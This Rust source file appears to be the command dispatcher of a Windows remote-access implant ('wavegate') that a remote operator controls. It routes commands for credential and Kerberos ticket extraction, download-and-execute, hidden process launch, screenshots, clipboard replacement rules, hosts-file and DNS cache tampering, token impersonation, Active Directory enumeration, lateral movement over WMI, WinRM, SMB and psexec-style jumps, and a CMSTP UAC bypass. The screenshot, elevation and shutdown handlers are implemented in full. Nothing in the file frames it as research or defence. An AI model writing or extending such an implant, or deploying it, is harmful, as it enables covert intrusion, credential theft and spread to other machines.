//! Command handlers for client-side execution.

use wavegate_shared::{CommandType, CommandResponseData, BinaryMediaFrame};
use tokio::sync::mpsc;
use std::os::windows::process::CommandExt;
use std::os::windows::ffi::OsStrExt;
use windows::core::PCWSTR;
use windows::Win32::Foundation::*;
use windows::Win32::Graphics::Gdi::*;
use windows::Win32::UI::WindowsAndMessaging::*;
use windows::Win32::UI::Shell::ShellExecuteW;
use windows::Win32::System::Shutdown::{ExitWindowsEx, LockWorkStation, EWX_LOGOFF, EWX_FORCE, SHUTDOWN_REASON};

use crate::chat;
use crate::clipboard;
use crate::dns;
use crate::filemanager;
use crate::media;
use crate::processmanager;
use crate::services;
use crate::startupmanager;
use crate::tcpconnections;

const CREATE_NO_WINDOW: u32 = 0x08000000;

/// Execute a command and return the response data.
pub fn execute_command(command: &CommandType) -> (bool, CommandResponseData) {
    match command {
        CommandType::Shutdown { force, delay_secs } => {
            execute_shutdown(*force, *delay_secs)
        }
        CommandType::Reboot { force, delay_secs } => {
            execute_reboot(*force, *delay_secs)
        }
        CommandType::Logoff { force } => {
            execute_logoff(*force)
        }
        CommandType::Lock => {
            execute_lock()
        }
        CommandType::MessageBox { title, message, icon } => {
            execute_messagebox(title, message, icon)
        }
        CommandType::Uninstall => {
            execute_uninstall()
        }
        // Disconnect, Reconnect, RestartClient are handled directly in main.rs
        // as one-shot commands that don't send responses
        CommandType::Disconnect | CommandType::Reconnect | CommandType::RestartClient => {
            // This should never be reached - handled in main.rs before execute_command
            (false, CommandResponseData::Error {
                message: "Command should be handled in main loop".to_string(),
            })
        }
        CommandType::Elevate => {
            execute_elevate()
        }
        CommandType::ForceElevate => {
            execute_force_elevate()
        }
        // File Manager commands
        CommandType::ListDrives => {
            filemanager::list_drives()
        }
        CommandType::ListDirectory { path } => {
            filemanager::list_directory(path)
        }
        CommandType::FileDownload { path } => {
            filemanager::download_file(path)
        }
        CommandType::FileUpload { path, data } => {
            filemanager::upload_file(path, data)
        }
        CommandType::FileDelete { path, recursive } => {
            filemanager::delete_path(path, *recursive)
        }
        CommandType::FileRename { old_path, new_path } => {
            filemanager::rename_path(old_path, new_path)
        }
        CommandType::CreateDirectory { path } => {
            filemanager::create_directory(path)
        }
        CommandType::FileCopy { source, destination } => {
            filemanager::copy_path(source, destination)
        }
        CommandType::FileExecute { path, args, hidden, delete_after, independent } => {
            filemanager::execute_file(path, args.as_deref(), *hidden, *delete_after, *independent)
        }
        CommandType::DownloadExecute { url, path, args, hidden, delete_after, independent } => {
            filemanager::download_and_execute(url, path, args.as_deref(), *hidden, *delete_after, *independent)
        }
        // Process Manager commands
        CommandType::ListProcesses => {
            processmanager::list_processes()
        }
        CommandType::KillProcess { pid } => {
            processmanager::kill_process(*pid)
        }
        // Startup Manager commands
        CommandType::ListStartupEntries => {
            startupmanager::list_startup_entries()
        }
        CommandType::RemoveStartupEntry { entry_type, registry_key, registry_value, file_path } => {
            startupmanager::remove_startup_entry(
                entry_type,
                registry_key.as_deref(),
                registry_value.as_deref(),
                file_path.as_deref(),
            )
        }
        // TCP Connections commands
        CommandType::ListTcpConnections => {
            tcpconnections::list_tcp_connections()
        }
        CommandType::KillTcpConnection { pid } => {
            tcpconnections::kill_tcp_connection(*pid)
        }
        // Services commands
        CommandType::ListServices => {
            services::list_services()
        }
        CommandType::StartService { name } => {
            services::start_service(name)
        }
        CommandType::StopService { name } => {
            services::stop_service(name)
        }
        CommandType::RestartService { name } => {
            services::restart_service(name)
        }
        // Chat commands
        CommandType::ChatStart { operator_name } => {
            execute_chat_start(operator_name)
        }
        CommandType::ChatMessage { message } => {
            execute_chat_message(message)
        }
        CommandType::ChatClose => {
            execute_chat_close()
        }
        // Credential extraction
        CommandType::GetCredentials => {
            crate::credentials::extract_credentials()
        }
        // Open URL
        CommandType::OpenUrl { url, hidden } => {
            execute_open_url(url, *hidden)
        }
        // Screenshot
        CommandType::Screenshot => {
            execute_screenshot()
        }
        // Clipboard commands
        CommandType::GetClipboard => {
            clipboard::get_clipboard()
        }
        CommandType::SetClipboard { data } => {
            clipboard::set_clipboard(data)
        }
        CommandType::AddClipboardRule { id, pattern, replacement, enabled } => {
            clipboard::add_rule(id, pattern, replacement, *enabled)
        }
        CommandType::RemoveClipboardRule { id } => {
            clipboard::remove_rule(id)
        }
        CommandType::UpdateClipboardRule { id, enabled } => {
            clipboard::update_rule(id, *enabled)
        }
        CommandType::ListClipboardRules => {
            clipboard::list_rules()
        }
        CommandType::ClearClipboardHistory => {
            clipboard::clear_history()
        }
        // Media commands
        CommandType::ListMediaDevices => {
            media::get_media_devices()
        }
        CommandType::StopMediaStream => {
            media::stop_media_stream()
        }
        CommandType::StartMediaStream { .. } => {
            (false, CommandResponseData::Error {
                message: "StartMediaStream requires frame channel - use execute_media_command".to_string(),
            })
        }
        // DNS/Hosts commands
        CommandType::GetHostsEntries => {
            dns::get_hosts_entries()
        }
        CommandType::AddHostsEntry { hostname, ip } => {
            dns::add_hosts_entry(hostname, ip)
        }
        CommandType::RemoveHostsEntry { hostname } => {
            dns::remove_hosts_entry(hostname)
        }
        // Task Scheduler commands
        CommandType::ListScheduledTasks => {
            crate::taskscheduler::list_scheduled_tasks()
        }
        CommandType::RunScheduledTask { name } => {
            crate::taskscheduler::run_task(name)
        }
        CommandType::EnableScheduledTask { name } => {
            crate::taskscheduler::enable_task(name)
        }
        CommandType::DisableScheduledTask { name } => {
            crate::taskscheduler::disable_task(name)
        }
        CommandType::DeleteScheduledTask { name } => {
            crate::taskscheduler::delete_task(name)
        }
        CommandType::CreateScheduledTask { name, description, action_path, action_args, trigger_type, start_time, interval } => {
            crate::taskscheduler::create_task(
                name,
                description.as_deref(),
                action_path,
                action_args.as_deref(),
                trigger_type,
                start_time.as_deref(),
                *interval,
            )
        }
        // WMI commands
        CommandType::WmiQuery { query, namespace } => {
            crate::wmi::execute_query(query, namespace.as_deref())
        }
        // DNS Cache commands
        CommandType::GetDnsCache => {
            crate::dnscache::get_dns_cache()
        }
        CommandType::FlushDnsCache => {
            crate::dnscache::flush_dns_cache()
        }
        CommandType::AddDnsCacheEntry { hostname, ip } => {
            crate::dnscache::add_dns_entry(hostname, ip)
        }
        // Lateral Movement commands
        CommandType::LateralScanNetwork { subnet, ports } => {
            crate::lateral::scan_network(subnet, ports.clone())
        }
        CommandType::LateralEnumShares { host } => {
            crate::lateral::enum_shares(host)
        }
        CommandType::LateralTestCredentials { host, username, password, protocol } => {
            crate::lateral::test_credentials(host, username, password, protocol)
        }
        CommandType::LateralExecWmi { host, username, password, command } => {
            crate::lateral::exec_wmi(host, username, password, command)
        }
        CommandType::LateralExecWinRm { host, username, password, command } => {
            crate::lateral::exec_winrm(host, username, password, command)
        }
        CommandType::LateralExecSmb { host, username, password, command } => {
            crate::lateral::exec_smb(host, username, password, command)
        }
        CommandType::LateralDeploy { host, username, password, method } => {
            crate::lateral::deploy_client(host, username, password, method)
        }

        // Token Management commands
        CommandType::TokenMake { domain, username, password } => {
            crate::token::make_token(domain, username, password)
        }
        CommandType::TokenList => {
            crate::token::list_tokens()
        }
        CommandType::TokenImpersonate { token_id } => {
            crate::token::impersonate_token(*token_id)
        }
        CommandType::TokenRevert => {
            crate::token::revert_token()
        }
        CommandType::TokenDelete { token_id } => {
            crate::token::delete_token(*token_id)
        }

        // Jump commands (remote execution with payload deployment)
        CommandType::JumpScshell { host, service_name, executable_path } => {
            crate::lateral::jump_scshell(host, service_name, executable_path)
        }
        CommandType::JumpPsexec { host, service_name, executable_path } => {
            crate::lateral::jump_psexec(host, service_name, executable_path)
        }
        CommandType::JumpWinrm { host, executable_path } => {
            crate::lateral::jump_winrm(host, executable_path)
        }

        // Pivot commands
        CommandType::PivotSmbConnect { host, pipe_name } => {
            crate::lateral::pivot_smb_connect(host, pipe_name)
        }
        CommandType::PivotSmbDisconnect { pivot_id } => {
            crate::lateral::pivot_smb_disconnect(*pivot_id)
        }
        CommandType::PivotList => {
            crate::lateral::pivot_list()
        }

        // =========================================================================
        // Active Directory Enumeration Commands
        // =========================================================================

        CommandType::AdGetDomainInfo => {
            crate::ad::get_domain_info()
        }
        CommandType::AdEnumUsers { filter, search } => {
            crate::ad::enum_users(filter.clone(), search.clone())
        }
        CommandType::AdEnumGroups { search } => {
            crate::ad::enum_groups(search.clone())
        }
        CommandType::AdGetGroupMembers { group_name } => {
            crate::ad::get_group_members(group_name)
        }
        CommandType::AdEnumComputers { filter, search } => {
            crate::ad::enum_computers(filter.clone(), search.clone())
        }
        CommandType::AdEnumSpns { search } => {
            crate::ad::enum_spns(search.clone())
        }
        CommandType::AdEnumSessions { target } => {
            crate::ad::enum_sessions(target.clone())
        }
        CommandType::AdEnumTrusts => {
            crate::ad::enum_trusts()
        }

        // =========================================================================
        // Kerberos Commands
        // =========================================================================

        CommandType::KerberosExtractTickets => {
            crate::kerberos::extract_tickets()
        }
        CommandType::KerberosPurgeTickets => {
            crate::kerberos::purge_tickets()
        }

        // =========================================================================
        // Local Security Commands
        // =========================================================================

        CommandType::EnumLocalGroups => {
            crate::local_security::enum_local_groups()
        }
        CommandType::EnumRemoteAccessRights => {
            crate::local_security::enum_remote_access_rights()
        }
        CommandType::AdEnumAcls { object_type, target_dn } => {
            crate::ad::enum_acls(object_type.clone(), target_dn.clone())
        }

        // Not yet implemented
        _ => (false, CommandResponseData::Error {
            message: format!("Command not implemented: {:?}", command),
        }),
    }
}

/// Start media stream with frame channel
pub fn start_media_stream_with_channel(
    video_device: Option<String>,
    audio_device: Option<String>,
    fps: u8,
    quality: u8,
    resolution: Option<String>,
    frame_tx: mpsc::UnboundedSender<BinaryMediaFrame>,
) -> (bool, CommandResponseData) {
    media::start_media_stream(video_device, audio_device, fps, quality, resolution, frame_tx)
}

fn execute_open_url(url: &str, hidden: bool) -> (bool, CommandResponseData) {
    let mut cmd = std::process::Command::new("cmd");
    cmd.args(["/c", "start", "", url]);

    if hidden {
        cmd.creation_flags(CREATE_NO_WINDOW);
    }

    match cmd.spawn() {
        Ok(_) => (true, CommandResponseData::UrlResult { success: true }),
        Err(_) => (false, CommandResponseData::Error {
            message: "Failed to open URL".to_string(),
        }),
    }
}

fn execute_screenshot() -> (bool, CommandResponseData) {
    unsafe {
        let width = GetSystemMetrics(SM_CXSCREEN);
        let height = GetSystemMetrics(SM_CYSCREEN);

        if width == 0 || height == 0 {
            return (false, CommandResponseData::Error {
                message: "Failed to get screen dimensions".to_string(),
            });
        }

        let screen_dc = GetDC(None);
        if screen_dc.is_invalid() {
            return (false, CommandResponseData::Error {
                message: "Failed to get screen DC".to_string(),
            });
        }

        let mem_dc = CreateCompatibleDC(Some(screen_dc));
        if mem_dc.is_invalid() {
            ReleaseDC(None, screen_dc);
            return (false, CommandResponseData::Error {
                message: "Failed to create memory DC".to_string(),
            });
        }

        let bitmap = CreateCompatibleBitmap(screen_dc, width, height);
        if bitmap.is_invalid() {
            DeleteDC(mem_dc);
            ReleaseDC(None, screen_dc);
            return (false, CommandResponseData::Error {
                message: "Failed to create bitmap".to_string(),
            });
        }

        let old_bitmap = SelectObject(mem_dc, bitmap.into());
        let _ = BitBlt(mem_dc, 0, 0, width, height, Some(screen_dc), 0, 0, SRCCOPY);

        let mut bmp_info = BITMAPINFO {
            bmiHeader: BITMAPINFOHEADER {
                biSize: std::mem::size_of::<BITMAPINFOHEADER>() as u32,
                biWidth: width,
                biHeight: -height,
                biPlanes: 1,
                biBitCount: 24,
                biCompression: BI_RGB.0,
                biSizeImage: 0,
                biXPelsPerMeter: 0,
                biYPelsPerMeter: 0,
                biClrUsed: 0,
                biClrImportant: 0,
            },
            bmiColors: [RGBQUAD::default()],
        };

        let stride = ((width * 3 + 3) & !3) as usize;
        let data_size = stride * height as usize;
        let mut pixels: Vec<u8> = vec![0u8; data_size];

        let result = GetDIBits(
            mem_dc,
            bitmap,
            0,
            height as u32,
            Some(pixels.as_mut_ptr() as *mut _),
            &mut bmp_info,
            DIB_RGB_COLORS,
        );

        SelectObject(mem_dc, old_bitmap);
        DeleteObject(bitmap.into());
        DeleteDC(mem_dc);
        ReleaseDC(None, screen_dc);

        if result == 0 {
            return (false, CommandResponseData::Error {
                message: "Failed to get bitmap data".to_string(),
            });
        }

        let mut rgb_data = Vec::with_capacity((width * 3) as usize * height as usize);
        for row in pixels.chunks(stride) {
            for pixel in row[..width as usize * 3].chunks(3) {
                rgb_data.push(pixel[2]);
                rgb_data.push(pixel[1]);
                rgb_data.push(pixel[0]);
            }
        }

        let jpeg_data = match std::panic::catch_unwind(|| {
            let mut comp = mozjpeg::Compress::new(mozjpeg::ColorSpace::JCS_RGB);
            comp.set_size(width as usize, height as usize);
            comp.set_quality(85.0);

            let mut output = Vec::new();
            let mut started = comp.start_compress(&mut output).ok()?;
            started.write_scanlines(&rgb_data).ok()?;
            started.finish().ok()?;
            Some(output)
        }) {
            Ok(Some(data)) if !data.is_empty() => data,
            _ => {
                return (false, CommandResponseData::Error {
                    message: "Failed to encode JPEG".to_string(),
                });
            }
        };

        (true, CommandResponseData::Screenshot { data: jpeg_data })
    }
}

fn execute_shutdown(force: bool, delay_secs: u32) -> (bool, CommandResponseData) {
    let force_flag = if force { "/f" } else { "" };
    let result = std::process::Command::new("shutdown")
        .args(["/s", "/t", &delay_secs.to_string(), force_flag])
        .output();

    match result {
        Ok(output) if output.status.success() => {
            (true, CommandResponseData::Generic {
                message: format!("Shutdown initiated (delay: {}s)", delay_secs),
            })
        }
        Ok(output) => {
            (false, CommandResponseData::Error {
                message: String::from_utf8_lossy(&output.stderr).to_string(),
            })
        }
        Err(_) => {
            (false, CommandResponseData::Error {
                message: "Failed to execute shutdown".to_string(),
            })
        }
    }
}

fn execute_reboot(force: bool, delay_secs: u32) -> (bool, CommandResponseData) {
    let force_flag = if force { "/f" } else { "" };
    let result = std::process::Command::new("shutdown")
        .args(["/r", "/t", &delay_secs.to_string(), force_flag])
        .output();

    match result {
        Ok(output) if output.status.success() => {
            (true, CommandResponseData::Generic {
                message: format!("Reboot initiated (delay: {}s)", delay_secs),
            })
        }
        Ok(output) => {
            (false, CommandResponseData::Error {
                message: String::from_utf8_lossy(&output.stderr).to_string(),
            })
        }
        Err(_) => {
            (false, CommandResponseData::Error {
                message: "Failed to execute reboot".to_string(),
            })
        }
    }
}

fn execute_logoff(force: bool) -> (bool, CommandResponseData) {
    let flags = if force {
        EWX_LOGOFF | EWX_FORCE
    } else {
        EWX_LOGOFF
    };

    let result = unsafe {
        ExitWindowsEx(flags, SHUTDOWN_REASON(0))
    };

    match result {
        Ok(_) => {
            (true, CommandResponseData::Generic {
                message: "Logoff initiated".to_string(),
            })
        }
        Err(_) => {
            (false, CommandResponseData::Error {
                message: "Failed to logoff".to_string(),
            })
        }
    }
}

fn execute_lock() -> (bool, CommandResponseData) {
    let result = unsafe { LockWorkStation() };

    match result {
        Ok(_) => {
            (true, CommandResponseData::Generic {
                message: "Workstation locked".to_string(),
            })
        }
        Err(_) => {
            (false, CommandResponseData::Error {
                message: "Failed to lock workstation".to_string(),
            })
        }
    }
}

fn execute_messagebox(title: &str, message: &str, icon: &str) -> (bool, CommandResponseData) {
    let title_owned = title.to_string();
    let message_owned = message.to_string();
    let icon_owned = icon.to_string();

    std::thread::spawn(move || {
        let title_wide: Vec<u16> = title_owned.encode_utf16().chain(std::iter::once(0)).collect();
        let message_wide: Vec<u16> = message_owned.encode_utf16().chain(std::iter::once(0)).collect();

        let icon_style: MESSAGEBOX_STYLE = match icon_owned.as_str() {
            "warning" => MB_ICONWARNING,
            "error" => MB_ICONERROR,
            _ => MB_ICONINFORMATION,
        };

        unsafe {
            MessageBoxW(
                None,
                PCWSTR(message_wide.as_ptr()),
                PCWSTR(title_wide.as_ptr()),
                MB_OK | icon_style,
            );
        }
    });

    (true, CommandResponseData::Generic {
        message: "Message box displayed".to_string(),
    })
}

fn execute_uninstall() -> (bool, CommandResponseData) {
    crate::startup::perform_uninstall();
    (true, CommandResponseData::Generic {
        message: "Uninstall initiated".to_string(),
    })
}

fn execute_elevate() -> (bool, CommandResponseData) {
    if let Ok(exe_path) = std::env::current_exe() {
        let exe_wide: Vec<u16> = exe_path.as_os_str().encode_wide().chain(std::iter::once(0)).collect();
        let verb: Vec<u16> = "runas\0".encode_utf16().collect();

        unsafe {
            let result = ShellExecuteW(
                None,
                PCWSTR(verb.as_ptr()),
                PCWSTR(exe_wide.as_ptr()),
                PCWSTR::null(),
                PCWSTR::null(),
                SW_SHOWNORMAL,
            );

            if result.0 as usize > 32 {
                std::thread::sleep(std::time::Duration::from_millis(500));
                std::process::exit(0);
            }
        }

        return (false, CommandResponseData::Error {
            message: "User declined elevation or elevation failed".to_string(),
        });
    }

    (false, CommandResponseData::Error {
        message: "Failed to get executable path".to_string(),
    })
}

fn execute_force_elevate() -> (bool, CommandResponseData) {
    use crate::startup;

    // Check if already elevated
    if startup::is_elevated() {
        return (true, CommandResponseData::Generic {
            message: "Already running as administrator".to_string(),
        });
    }

    // Use CMSTP bypass for auto-elevation
    if startup::force_elevate() {
        // Give the elevated process time to start
        std::thread::sleep(std::time::Duration::from_millis(500));
        std::process::exit(0);
    }

    (false, CommandResponseData::Error {
        message: "Force elevation failed".to_string(),
    })
}

fn execute_chat_start(operator_name: &str) -> (bool, CommandResponseData) {
    match chat::start_chat(operator_name) {
        Ok(_) => (true, CommandResponseData::ChatStarted),
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to start chat: {}", e),
        }),
    }
}

fn execute_chat_message(message: &str) -> (bool, CommandResponseData) {
    match chat::send_message(message) {
        Ok(_) => (true, CommandResponseData::Generic {
            message: "Message sent".to_string(),
        }),
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to send message: {}", e),
        }),
    }
}

fn execute_chat_close() -> (bool, CommandResponseData) {
    match chat::close_chat() {
        Ok(_) => (true, CommandResponseData::ChatClosed),
        Err(e) => (false, CommandResponseData::Error {
            message: format!("Failed to close chat: {}", e),
        }),
    }
}

/// Poll for chat events - called from main loop
pub fn poll_chat_event() -> Option<CommandResponseData> {
    if let Some(event) = chat::poll_event() {
        match event {
            chat::ChatEvent::UserMessage(msg) => {
                Some(CommandResponseData::ChatUserMessage { message: msg })
            }
            chat::ChatEvent::WindowClosed => {
                Some(CommandResponseData::ChatClosed)
            }
        }
    } else {
        None
    }
}
